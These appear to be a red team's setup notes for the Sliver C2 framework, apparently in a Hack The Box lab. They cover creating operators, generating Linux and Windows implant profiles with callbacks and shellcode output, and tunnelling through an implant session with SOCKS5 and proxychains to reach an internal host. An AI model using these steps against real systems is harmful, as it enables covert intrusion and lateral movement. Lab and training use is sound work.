


# Documentation

## sliver setup


```
sudo /root/sliver-server operator --name CPT_09 --lhost 34.168.225.20 --lport 31337 --save 09_34.168.225.20.cfg
```


```
root@sliverc2:~# systemctl start sliver.service
root@sliverc2:~# systemctl status sliver.service
WARNING: terminal is not fully functional
Press RETURN to continue
● sliver.service - Sliver
     Loaded: loaded (/etc/systemd/system/sliver.service; disabled; preset: enabled)
     Active: active (running) since Thu 2024-07-04 15:07:48 UTC; 3s ago
   Main PID: 974 (sliver-server)
      Tasks: 8 (limit: 9512)
     Memory: 10.7M
        CPU: 73ms
     CGroup: /system.slice/sliver.service
             └─974 /root/sliver-server daemon

Jul 04 15:07:48 sliverc2 systemd[1]: Started sliver.service - Sliver.
root@sliverc2:~#
```

## Creating a operator 

The dev (randal our bbg) should be the one that creates a profile for you and assigns your funny name.

```
sudo /root/sliver-server operator --name CPT_09 --lhost 34.168.225.20 --lport 31337 --save 09_34.168.225.20.cfg
sudo /root/sliver-server operator --name <FUNNY_NAME> --lhost <PUBLIC_IP> --lport 31337 --save SAVE_FILE_HERE.cfg
```

## Using that operator client

Once the profile is created you need to import it locally using the following command

```
sudo sliver-client import ./09_34.168.225.20.cfg
```

Now when you launch `sliver-client` you should be able to see your new profile



## Creating profiles (dev stuff dont try)

```
https
profiles new --http 10.10.14.7 -l -G --os linux https_nix
profiles new --http 10.10.14.7 -e https_win
profiles new --http 10.10.14.7 -e --format shellcode -l -G https_win_sh

profiles generate https_nix
profiles generate https_win
profiles generate https_win_sh
```


## PROXY

everyone needs to run their own proxy, the ports are the same.  

starts a socks proxy to listen on localhost:1081, any transactions that go through with proxychains will go through this session

![[Notess-20240704205917525.webp]]

You need to use a session first which is the most important part, secondly you need to start a socks5. remember this is local so you will have to set it up everytime.

```
sliver (CLASSICAL_PATRIOT) > socks5 start --user jess

⚠️  SOCKS proxy authentication credentials are tunneled to the implant
⚠️  These credentials are recoverable from the implant's memory!

? Do you understand the implication? Yes

[*] Started SOCKS5 127.0.0.1 1081 jess RANDOMLYGENERATEDPASSWORD
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol

```

edit `/etc/proxychains4.conf` and Make sure to pay attention to he generated password
`socks5 127.0.0.1 1081 jess RANDOMLYGENERATEDPASSWORD`

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1081 jess rsVW7Ia5ew2kodzID1TYAA
```



```
kali@kali ~> proxychains curl -k https://painters.htb/home
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.110.35:443  ...  OK
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>PAINTERS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <!-- Favicon -->
    <link href="/static/img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
```


FAQ
- Check your /etc/hosts
	- Check you added painters
- check your /etc/proxychains
	- Check the username
	- check the password
	- check your timeout

## TO - DO list:

- Using redelk
- use terraform
- https://github.com/outflanknl/RedELK?tab=readme-ov-file
- 